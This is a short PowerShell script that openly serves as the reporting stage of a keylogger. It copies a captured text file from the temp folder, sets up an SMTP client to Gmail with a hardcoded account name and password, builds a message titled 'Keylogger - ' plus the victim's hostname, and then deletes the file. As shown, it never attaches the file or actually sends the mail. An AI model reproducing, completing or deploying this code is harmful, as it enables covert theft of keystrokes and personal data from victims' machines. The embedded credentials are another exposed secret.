New-item -path $ENV:temp\test –type directory
Copy-Item -Path $env:temp\testing123.txt -Destination $env:temp\test\
timeout 10
$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('pruebapoloa@gmail.com', 'polopolo123')
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'pruebapoloa@gmail.com'
$ReportEmail.To.Add('pruebapoloa@gmail.com')
$ReportEmail.Subject = 'Keylogger - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
timeout 10
Remove-Item $env:temp\test\testing123.txt
